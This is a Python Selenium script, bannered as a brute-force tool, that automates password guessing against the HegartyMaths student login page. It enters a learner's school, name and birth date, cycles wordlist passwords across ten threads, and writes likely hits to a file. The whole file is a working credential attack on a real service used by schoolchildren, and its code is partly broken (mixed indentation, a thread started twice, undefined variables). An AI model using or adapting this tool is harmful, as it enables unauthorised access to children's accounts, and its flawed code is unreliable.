from __future__ import print_function
import threading
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
parser = OptionParser()
now = datetime.datetime.now()
def reset(Sel_pas):
   for _ in range(23): Sel_pas.send_keys(Keys.BACK_SPACE)
CHROME_DVR_DIR = 'C:\webdrivers\chromedriver.exe'
def wizard():
    website = "https://hegartymaths.com/login/learner"
    school_selector = "body > div.container > div > div > div.pr > input"
    username_selector1 = "body > div.container > div > div > form > div:nth-child(1) > div > input:nth-child(1)"
    username_selector2 = "body > div.container > div > div > form > div:nth-child(1) > div > input:nth-child(2)"
    username_selector3 = "#day"
    username_selector4 = "#month"
    username_selector5="#year"
    username_btn_selector= "body > div > div > div > form > div:nth-child(3) > button"
    password_selector = "body > div.container > div > div > form > input"
    login_btn_selector = "body > div.container > div > div > form > p.text-center > button"
    failed_btn_selector = "body > div.sweet-alert.showSweetAlert.visible > div.sa-button-container > div > button"
    #body > div.sweet-alert.showSweetAlert.visible > div.sa-button-container > div > button
    school="" #enter school name here
    username5=""#year e.g. 2007
    username4=""#month e.g. January
    username3=""#day e.g. 4
    username2= ""#lastname e.g. Doe
    username1 = ""#firstname e.g. Jhon
    pass_list="C:/actualwordlist/wordlist"+numberofconcurrent+".txt"# ACTUAL F FILE
    brutes(pore,donesofar,failed_btn_selector,school,website,username5,username4,username3,username2,username1,pass_list,school_selector,username_selector1,username_selector2,username_selector3,username_btn_selector,username_selector4,username_selector5,password_selector,login_btn_selector)

def brutes(pore,donesofar,failed_btn_selector,school,website,username5,username4,username3,username2,username1,pass_list,school_selector,username_selector1,username_selector2,username_selector3,username_btn_selector,username_selector4,username_selector5,password_selector,login_btn_selector):
    f=pore
    print(len(f))#if this returns 0 then do f=open("C:\python27\<filename>.txt","r")
    #driver = webdriver.Chrome(CHROME_DVR_DIR)#prevents unnecessary excess tab launch
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    count,browser,COUNTERRRR= 1,webdriver.Chrome(CHROME_DVR_DIR),1 
    while True:
            browser.get(website)
            t.sleep(2)
            while COUNTERRRR!=0:
              Sel_school = browser.find_element_by_css_selector(school_selector) #Finds Selector
              Sel_school.send_keys(school)
              t.sleep(7)
              Sel_school.send_keys(Keys.RETURN)
              t.sleep(2)
              COUNTERRRR=COUNTERRRR-1
            Sel_user1 = browser.find_element_by_css_selector(username_selector1) #Finds Selector
            Sel_user2 = browser.find_element_by_css_selector(username_selector2) #Finds Selector
            Sel_user3 = browser.find_element_by_css_selector(username_selector3) #Finds Selector
            Sel_user4 = browser.find_element_by_css_selector(username_selector4) #Finds Selector
            Sel_user5 = browser.find_element_by_css_selector(username_selector5) #Finds Selector

            Sel_user1.send_keys(username1)
            Sel_user2.send_keys(username2)
            Sel_user3.send_keys(username3)
            Sel_user4.send_keys(username4)
            Sel_user5.send_keys(username5)
            Sel_user1.send_keys(Keys.RETURN)
            t.sleep(3)
            try:
                for line in f:
                    temp = line 
                    Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                    donesofar=donesofar+1
                    ofc1=threading.Thread(target=reset(Sel_pas))
                    ofc1.start()
                    Sel_pas.send_keys(line)
                    Sel_pas.send_keys(Keys.ENTER)
                    t.sleep(1)#NEEDED DO NOT REMOVE
                    bp,psych=0,0
                    while bp==0:#false
                       try:
                             failed = browser.find_element_by_css_selector(failed_btn_selector)
                             failed.send_keys(Keys.RETURN)
			     t.sleep(1)
                             bp=1
                       except: 
			 try:
			     Sel_pas.send_keys(Keys.ENTER)
			     t.sleep(1)
                             print('\rFailed element not found!', end='')
                             bp=0
			 except:print("passed")
                    print('\rTried password: '+line+' for '+username1+' '+username2+'.')
                    donesofar=donesofar+1
            except KeyboardInterrupt:
		stop_threads = True
		t1.join()
		t2.join()
		t3.join()
		t4.join()
		t5.join()
		t6.join()
		t7.join()
		t8.join()
		t9.join()
		t10.join()
                exit()
            except selenium.common.exceptions.NoSuchElementException:
                print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS: EITHER THE PASSWORD WAS FOUND OR YOU MUST RESTART IT')
                print('LAST PASS ATTEMPT BELOW OR ABOVE')
                temp=line
                print('Password has been found: '+temp)
                print("ALLAHUAKBAR"*1000)
		with open("possible.txt","a") as possiblepasswords:
                	possiblepasswords.write("The key: |"+str(temp)+"| is possible, at index:"+str(f.index(temp)))
                	possiblepasswords.write(" or it could mean that the previous key was successful: "+str(f[(f.index(temp))-1])+" or.."+str(f[(f.index(temp))-2])+"\n")
		stop_threads = True
		t1.join()
		t2.join()
		t3.join()
		t4.join()
		t5.join()
		t6.join()
		t7.join()
		t8.join()
		t9.join()
		t10.join()
                exit()

banner ='''
V4.2x 
coded by iscoolguy#3341
brute-force tool                      '''
#driver = webdriver.Chrome(CHROME_DVR_DIR)
optionss,count = webdriver.ChromeOptions(),1
optionss.add_argument("--disabled-popup-blocking")
optionss.add_argument("--disabled-extensions")
t1=threading.Thread(target=wizard)
t2=threading.Thread(target=wizard)
t3=threading.Thread(target=wizard)
t4=threading.Thread(target=wizard)
t5=threading.Thread(target=wizard)
t6=threading.Thread(target=wizard)
t7=threading.Thread(target=wizard)
t8=threading.Thread(target=wizard)
t9=threading.Thread(target=wizard)
t10=threading.Thread(target=wizard)
t11=threading.Thread(target=wizard)
t12=threading.Thread(target=wizard)
t13=threading.Thread(target=wizard)
t14=threading.Thread(target=wizard)
t15=threading.Thread(target=wizard)
t16=threading.Thread(target=wizard)
t17=threading.Thread(target=wizard)
t18=threading.Thread(target=wizard)
t19=threading.Thread(target=wizard)
t20=threading.Thread(target=wizard)
#needs fake threads to open actual active processers, preferrably 2n

with open("howmanyconcurrent.txt",'r') as concurrent:numberofconcurrent=(concurrent.readlines())[0]
with open("howmanyconcurrent.txt",'w') as concurrento:
    numberofconcurrent=int(numberofconcurrent)+1#cc
    concurrento.write(str(numberofconcurrent))
with open("howmanyconcurrent.txt",'r') as concurrent: donesofar,numberofconcurrent,pass_list=0,str((concurrent.readlines())[0]),"a" #cc file made
print("Working on wordlist{}.".format(numberofconcurrent))
with open("C:/Python27/actualwordlist/wordlist"+numberofconcurrent+".txt","r") as openagain:#change wordlist if needed
  pof,al,alist,now="",0,[],0
  for i in openagain:
     pof,al,pgsla="",al+1,list(str(i))
     for o in range(0,1):pgsla.pop()
     for k in pgsla: pof=pof+k
     alist.append(pof)
  pof,al="",0
  half=len(alist)/2
  for i in openagain:
     if now<half:
        now=now+1
        pass
     else:
        al,pof=al+1,""
        pgsla=list(str(i))
        for o in range(0,1):pgsla.pop()
        for k in pgsla: pof=pof+k
        alist.append(pof)
p,reallylong=[],[]
list1,list2,list3,list4,list5,list6,list7,list8,list9,list10=[],[],[],[],[],[],[],[],[],[]
howspicy=9
for k in range(1,howspicy+1):p.append(k)
for i in range(1,(len(alist)//howspicy)):reallylong.append(i)
for i in reallylong:
      list1.append(alist[(howspicy*i)-howspicy-2])
      list2.append(alist[(howspicy*i)-howspicy-3])
      list3.append(alist[(howspicy*i)-howspicy-4])
      list4.append(alist[(howspicy*i)-howspicy-5])
      list5.append(alist[(howspicy*i)-howspicy-6])
      list6.append(alist[(howspicy*i)-howspicy-7])
      list7.append(alist[(howspicy*i)-howspicy-8])
      list8.append(alist[(howspicy*i)-howspicy-9])
      list9.append(alist[(howspicy*i)-howspicy-10])
      list10.append(alist[(howspicy*i)-howspicy-11])

print(banner)
t.sleep(1)
pore=list1
t1.start()

t.sleep(1)
pore=list2
t2.start()

t.sleep(1)
pore=list3
t3.start()

t.sleep(1)
pore=list4
t4.start()

t.sleep(1)
pore=list5
t5.start()

t.sleep(1)
pore=list6
t6.start()

t.sleep(1)
pore=list7
t7.start()

t.sleep(1)
pore=list8
t8.start()

t.sleep(1)
pore=list9
t9.start()

t.sleep(1)
pore=list10
t10.start()

t.sleep(1)
pore=list10
t10.start()
